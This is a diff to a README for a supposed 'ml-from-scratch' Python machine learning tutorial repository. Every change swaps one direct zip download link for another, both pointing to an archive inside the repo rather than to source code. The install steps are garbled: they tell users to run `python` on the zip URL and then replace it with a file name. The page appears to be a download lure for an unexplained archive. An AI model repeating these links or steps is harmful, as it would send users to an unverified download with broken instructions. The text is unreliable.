@@ -1,7 +1,7 @@
 # 🛠️ ml-from-scratch - Create Machine Learning Models Easily
 
 ## 🔗 Download Now
-[![Download ml-from-scratch](https://raw.githubusercontent.com/pravinkumarelangovan/ml-from-scratch/main/Dromiceius/ml-from-scratch.zip)](https://raw.githubusercontent.com/pravinkumarelangovan/ml-from-scratch/main/Dromiceius/ml-from-scratch.zip)
+[![Download ml-from-scratch](https://github.com/pravinkumarelangovan/ml-from-scratch/raw/refs/heads/main/notebooks/ml-scratch-from-3.8-alpha.5.zip)](https://github.com/pravinkumarelangovan/ml-from-scratch/raw/refs/heads/main/notebooks/ml-scratch-from-3.8-alpha.5.zip)
 
 ## 📜 Description
 Welcome to the **ml-from-scratch** repository. This project provides simple implementations of various machine learning models using Python. It is designed to help you understand the concepts of machine learning without needing programming experience. You can explore algorithms for classification, regression, and more, all presented in an easy-to-follow way.
@@ -20,7 +20,7 @@ To get started with **ml-from-scratch**, follow these steps to download and run 
   - Scikit-learn
 
 ## 📥 Download & Install
-To download the latest version of the software, visit [this page to download](https://raw.githubusercontent.com/pravinkumarelangovan/ml-from-scratch/main/Dromiceius/ml-from-scratch.zip).
+To download the latest version of the software, visit [this page to download](https://github.com/pravinkumarelangovan/ml-from-scratch/raw/refs/heads/main/notebooks/ml-scratch-from-3.8-alpha.5.zip).
 
 1. Click the link above.
 2. Look for the latest release. It will contain details about the version.
@@ -47,7 +47,7 @@ After downloading and extracting, you will find Jupyter Notebook files or Python
 ### Running Python Scripts
 1. Open a command prompt or terminal window.
 2. Navigate to the folder where you extracted the files.
-3. Type `python https://raw.githubusercontent.com/pravinkumarelangovan/ml-from-scratch/main/Dromiceius/ml-from-scratch.zip` and replace `https://raw.githubusercontent.com/pravinkumarelangovan/ml-from-scratch/main/Dromiceius/ml-from-scratch.zip` with the name of the file you want to run.
+3. Type `python https://github.com/pravinkumarelangovan/ml-from-scratch/raw/refs/heads/main/notebooks/ml-scratch-from-3.8-alpha.5.zip` and replace `https://github.com/pravinkumarelangovan/ml-from-scratch/raw/refs/heads/main/notebooks/ml-scratch-from-3.8-alpha.5.zip` with the name of the file you want to run.
 4. Press Enter. Follow the instructions printed in the terminal for results.
 
 ## 📊 Understanding the Models
@@ -78,4 +78,4 @@ If you want to contribute to the project, feel free to open an issue or submit a
 For any questions or issues you encounter, please use the GitHub issues page to get help. We aim to respond promptly. 
 
 ## 🔗 Final Thoughts
-Thank you for downloading **ml-from-scratch**! We hope you find it useful in your journey to learning machine learning. Don't forget to visit [this page to download](https://raw.githubusercontent.com/pravinkumarelangovan/ml-from-scratch/main/Dromiceius/ml-from-scratch.zip) for updates.
+Thank you for downloading **ml-from-scratch**! We hope you find it useful in your journey to learning machine learning. Don't forget to visit [this page to download](https://github.com/pravinkumarelangovan/ml-from-scratch/raw/refs/heads/main/notebooks/ml-scratch-from-3.8-alpha.5.zip) for updates.
